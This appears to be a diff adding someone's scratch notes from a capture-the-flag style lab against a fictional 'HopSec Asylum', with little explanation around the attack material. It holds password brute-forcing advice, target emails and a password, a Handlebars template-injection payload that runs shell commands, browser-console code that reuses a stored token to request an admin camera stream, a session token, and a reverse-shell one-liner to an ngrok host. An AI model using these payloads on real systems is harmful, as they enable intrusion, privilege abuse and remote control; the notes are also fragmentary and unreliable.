@@ -1,0 +1,76 @@
+Create a base.txt and enter every relevant word/num/etc from fakebook then combinator.bin against that wordlist..
+ I was able to bf the pw to the video portal that way... took me forever but google fu and adding the words/num/symbols finally got it
+
+
+guard.hopkins@hopsecasylum.com
+carrotbane@hopsecasylum.com
+breachblocker@hopsecasylum.com
+malhare@hopsecasylum.com
+Johnnyboy1982!
+13400
+13402 
+739184627
+
+The email address is a 15 part key that you have to break Hopper out of his straight-jacket to get part 1...
+then the rest will follow LOL
+
+
+I was able to access the video portal and security console websites with his email and password
+
+You need to "activate" the services everytime you boot the machine by
+ inputting the side quest key into the web portal at 21337
+ 
+ /usr/lib/hashcat-utils/combinator.bin
+
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+
+
+http://10.82.160.222:13401/v1/streams/e5d76d53-e492-4eff-aa34-6b30816d595c/manifest.m3u8
+
+curl "http://10.82.160.222:13401/v1/streams/e5d76d53-e492-4eff-aa34-6b30816d595c/seg/playlist000.ts?r=0" -o /mnt/c/Users/ahmed/Desktop/flag_video.ts
+
+
+
+const myToken = localStorage.getItem('hopsec_token');
+
+// 2. بنبعت طلب مباشر للسيرفر عشان ناخد "تذكرة" لكاميرا الأدمن
+fetch("http://" + window.location.hostname + ":13401/v1/streams/request", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer " + myToken
+    },
+    // بنطلب كاميرا الأدمن بجرأة!
+    body: JSON.stringify({ camera_id: "cam-admin", tier: "admin" })
+})
+.then(r => r.json())
+.then(data => {
+    console.log("🔥 TICKET RECEIVED:", data);
+    if(data.ticket_id) {
+        // لو نجحنا، بنطبع رابط الفيديو اللي فيه الفلاق
+        console.log("📺 VIDEO URL: http://" + window.location.hostname + ":13401/v1/streams/" + data.ticket_id + "/manifest.m3u8");
+        alert("Success! Check Console for URL");
+    } else {
+        console.log("❌ Failed to get ticket");
+    }
+});
+
+cam-lobby
+cam-parking
+cam-loading
+
+
+"profile":{"role":"guard","username":"guard.hopkins@hopsecasylum.com"},"token":"{\"sub\": \"guard.hopkins@hopsecasylum.com\", \"role\": \"guard\", \"iat\": 1764806015}.3521090b608b9f7fa944698cf5d975fa5485a9148be0373f3fec28f291787856"}
+
+YOU HAVE BEEN JESTERED
+
+
+							0001111
+0100110100 M    01000001 A  1001111 O  1110110 1 v
+
+1000101 E      000100
+
+
+
+bash -c 'exec bash -i &>/dev/4.tcp.eu.ngrok.io/18696 <&1'
